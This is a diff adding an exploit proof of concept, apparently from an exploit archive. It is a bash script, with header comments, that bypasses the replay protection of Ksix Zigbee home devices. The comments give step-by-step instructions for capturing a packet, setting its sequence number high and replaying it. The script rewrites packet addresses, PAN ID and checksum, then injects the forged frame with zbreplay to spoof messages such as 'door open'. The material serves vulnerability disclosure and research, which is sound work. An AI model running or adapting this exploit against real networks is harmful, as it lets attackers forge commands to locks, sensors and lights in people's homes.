@@ -1,0 +1,95 @@
+# Exploit Title: Ksix Zigbee Devices - Playback Protection Bypass (PoC)
+# Date: 2020-11-15
+# Exploit Author: Alejandro Vazquez Vazquez
+# Vendor Homepage: https://www.ksixmobile.com/
+# Firmware Version: (Gateway Zigbee Module - v1.0.3, Gateway Main Module - v1.1.2, Door Sensor - v1.0.7, PIR Motion Sensor - v1.0.12)
+# Tested on: Kali Linux 2020.3
+
+# The coordinator of the Zigbee network (Zigbee gateway) does not correctly check the sequence number of the packets that are sent to it, which allows forging messages from an end device to the coordinator (example: turn on a light bulb, open a door, ...) by injecting a very large value in the "sequence number" field.
+# To exploit this vulnerability
+#	1. Capture Zigbee traffic with a sniffer (Api-Mote) and save it in .pcap format
+#	2. Open the file with Wireshark and locate the packet you want to forward (turn on a light bulb, open a door, ...)
+#	3. Copy that packet as "hex dump" and save it to a .txt file
+#	4. Modify the "sequence number" field to a high value such as 250
+#	5. Convert the txt file to .pcap again
+#	6. Forward the packet to the network, using a tool such as Killerbee
+
+#!/bin/bash
+
+function usage(){
+	echo -e "\nUsage: $0 [ZigbeeChannel] [SecuenceNumber] [HexDumpFile] [ShortSource] [ExtendedSource] [ShortDestination] [ShortPanId] [FCS]"
+	echo -e "Example: $0 11 250 Open_Door_Alert_Hex_Dump 0x0001 11:ff:11:ff:11:ff:11:ff 0x0000 0x3333 0x0000 \n"
+	echo -e "IMPORTANT: This is a script that I developed to understand how an IEEE 802.15.4 / Zigbee packet is formed, modify some fields of the packet in a simple way and see the effect when forwarding it to the network. If you want to exploit the vulnerability, follow the steps that I specify in the comments I make in the script. I exploited the vulnerability by spoofing a packet (sequence number 250) that contained the message \"Door open\".\n"
+}
+
+function message(){
+	echo -e "\nProof of Concept"
+	echo -e "There is an incorrect check of the \"sequence number\" field on Ksix Zigbee devices\n"
+	echo -e "IMPORTANT: This is a script that I developed to understand how an IEEE 802.15.4 / Zigbee packet is formed, modify some fields of the packet in a simple way and see the effect when forwarding it to the network. If you want to exploit the vulnerability, follow the steps that I specify in the comments I make in the script. I exploited the vulnerability by spoofing a packet (sequence number 250) that contained the message \"Door open\".\n"
+}
+
+function poc_playback(){
+	# Variables
+	ZIGBEE_CHANNEL=$1
+	SECUENCE_NUMBER=$2
+	HEX_DUMP_FILE=$3
+	SHORT_SOURCE=$4
+	EXTENDED_SOURCE=$5
+	SHORT_DESTINATION=$6
+	SHORT_PAN_DESTINATION=$7
+	FRAME_CHECK_SECUENCE=$8
+	declare -a first_line_array
+	declare -a second_line_array
+	declare -a last_line_array
+	# Change packet fields
+	while IFS= read -r line
+	do
+		if [[ "$line" == "0000"* ]]; then
+			IFS=' ' read -ra first_line_array <<< "$line"
+			first_line_array[0]+="  "
+			first_line_array[3]=$( printf "%x" $SECUENCE_NUMBER )
+			first_line_array[4]=${SHORT_PAN_DESTINATION:4:2}
+			first_line_array[5]=${SHORT_PAN_DESTINATION:2:2}
+			first_line_array[6]=${SHORT_DESTINATION:4:2}; first_line_array[11]=${SHORT_DESTINATION:4:2}
+			first_line_array[7]=${SHORT_DESTINATION:2:2}; first_line_array[12]=${SHORT_DESTINATION:2:2}
+			first_line_array[8]=${SHORT_SOURCE:4:2}; first_line_array[13]=${SHORT_SOURCE:4:2}
+			first_line_array[9]=${SHORT_SOURCE:2:2}; first_line_array[14]=${SHORT_SOURCE:2:2}
+			echo "${first_line_array[@]}" > Check_Secuence_Number_Incorrectly_HEX_Dump
+		elif [[ "$line" == "0010"* ]]; then
+			IFS=' ' read -ra second_line_array <<< "$line"
+			second_line_array[0]+="  "
+			second_line_array[7]=${EXTENDED_SOURCE:21:2}; second_line_array[8]=${EXTENDED_SOURCE:18:2}
+			second_line_array[9]=${EXTENDED_SOURCE:15:2}; second_line_array[10]=${EXTENDED_SOURCE:12:2}
+			second_line_array[11]=${EXTENDED_SOURCE:9:2}; second_line_array[12]=${EXTENDED_SOURCE:6:2}
+			second_line_array[13]=${EXTENDED_SOURCE:3:2}; second_line_array[14]=${EXTENDED_SOURCE:0:2}
+			echo "${second_line_array[@]}" >> Check_Secuence_Number_Incorrectly_HEX_Dump
+		elif [[ "$line" == "0030"* ]]; then
+			IFS=' ' read -ra last_line_array <<< "$line"
+			last_line_array[0]+="  "
+			last_line_array[11]=${FRAME_CHECK_SECUENCE:4:2}
+			last_line_array[12]=${FRAME_CHECK_SECUENCE:2:2}
+			echo "${last_line_array[@]}" >> Check_Secuence_Number_Incorrectly_HEX_Dump
+		else
+			echo "$line" >> Check_Secuence_Number_Incorrectly_HEX_Dump
+		fi
+	done < $HEX_DUMP_FILE
+	# Hex Dump file to pcap
+	text2pcap Check_Secuence_Number_Incorrectly_HEX_Dump Check_Secuence_Number_Incorrectly.pcap
+	# Playback
+	zbreplay --channel $ZIGBEE_CHANNEL --pcapfile Check_Secuence_Number_Incorrectly.pcap && echo -e "\nPacket sent to the network. Poc Completed.\n"
+}
+
+function main(){
+	if [ $# -lt 8 ]; then
+		echo -e "\n\t Missing arguments"
+		usage
+		exit
+	else
+		message
+		poc_playback $1 $2 $3 $4 $5 $6 $7 $8
+	fi
+}
+
+main $1 $2 $3 $4 $5 $6 $7 $8
+
+#NOTE: This is a script that I developed to understand how an IEEE 802.15.4 / Zigbee packet is formed, modify some fields of the packet in a simple way and see the effect when forwarding it to the network. If you want to exploit the vulnerability, follow the steps that I specify in the comments I make in the script. I exploited the vulnerability by spoofing a packet (sequence number 250) that contained the message "Door open".
